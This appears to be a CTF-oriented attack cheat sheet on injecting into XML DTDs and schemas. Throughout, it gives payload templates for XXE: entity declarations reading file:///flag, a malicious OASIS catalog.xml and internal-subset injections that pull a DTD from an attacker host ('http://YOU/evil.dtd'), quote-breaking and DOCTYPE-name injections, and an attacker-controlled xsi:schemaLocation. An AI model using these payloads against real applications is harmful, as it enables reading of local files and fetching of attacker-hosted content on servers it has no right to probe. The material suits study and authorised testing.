# DTD Injection — injecting into a DTD the app already loads

## The shape — the app's own DTD is the carrier

Some apps let you inject INTO an existing DTD — a config file that
gets concatenated into a DTD, an ATTLIST field, an entity value you
control — you're not writing a DOCTYPE, you're writing INSIDE one.

## The "the app builds the DTD from your field" — the field-as-DTD

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "<FIELD>">]>
```

If `<FIELD>` is your input — inject `file:///flag` or `'> <payload>'`
— the field is the DTD — break the quoting, inject a new declaration.

## The "the app's DTD is in a file you can write" — DTD-file injection

If you can write `app.dtd`/`schema.dtd`/`config.dtd` — inject entities
into it — the app's own parse picks them up — `file-upload` chain —
XXE via file-write.

## The "the app's catalog.xml" — the OASIS catalog injection

```xml
<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
  <public publicId="-//X//EN" uri="http://YOU/evil.dtd"/>
  <system systemId="http://target/dtd" uri="file:///flag"/>
</catalog>
```

A `catalog.xml` maps public/system IDs to URIs — injecting a mapping
redirects the fetch — the app resolves its own IDs to YOUR files —
the catalog-injection attack.

## The "the ATTLIST default-value injection"

```xml
<!ATTLIST r a CDATA "&x;">
```

If you control the `a`'s default — `&x;` inside it — the attribute
carries the entity — `xml-structure-abuse.md`.

## The "the entity-VALUE injection" — the value-is-code

```xml
<!ENTITY x "<!ENTITY y SYSTEM 'file:///flag'>">
```

Your input lands inside an entity's value — inject `'>...<payload>...<'`
— break the value's quoting — inject a new decl.

## The "the DOCTYPE-name injection" — `DOCTYPE <YOURNAME>`

`<!DOCTYPE YOURNAME [...]>` — if you control the name — inject
`x [<!ENTITY x SYSTEM "file:///flag">]><r>x` — break the name, inject
the subset.

## The "the PUBLIC-id injection" — the id-as-URI

`<!ENTITY x PUBLIC "<YOURID>" "uri">` — inject a public-id that maps
to your DTD — or a system-id that overrides.

## The "the app prepends/appends your input" — the wrapping-DTD

```
<!DOCTYPE r [<!ENTITY x SYSTEM "http://YOU/e.dtd">%x;<YOURINPUT>]>
```

If your input lands inside the internal-subset — inject `<!ENTITY...>`
directly — you're already inside the DTD.

## The "the doc-injects-into-a-template" — the XML-template hole

The app builds `<?xml...?><!DOCTYPE r [${YOURINPUT}]><r>...</r>` —
your input is inside the subset — inject full `<!ENTITY` decls.

## The "the DTD is in a schema/RELAX-NG" — the alternate-schema surface

Not just DTDs — `xsd:schema`, `relax-ng` `rnc`/`rng`, `schematron` —
any schema the app loads from your input — schema-file entities.

## The "the app loads a DTD from a path" — the path-injection

A `dtd-path` config the app reads — inject `file:///flag` or
`http://YOU/e.dtd` as the path — the app's parse fetches YOUR DTD.

## The "the schema-location is injectable" — `xsi:schemaLocation`

```xml
<r xsi:schemaLocation="urn:x <YOUR-URL>"/>
```

The schemaLocation attr is a URI — inject your own XSD — `parser-abuse.md`.

## Falsifiers

- the app's DTD-load is hardcoded/not-affected-by-input → no injection
- the injected text is sanitized → dead
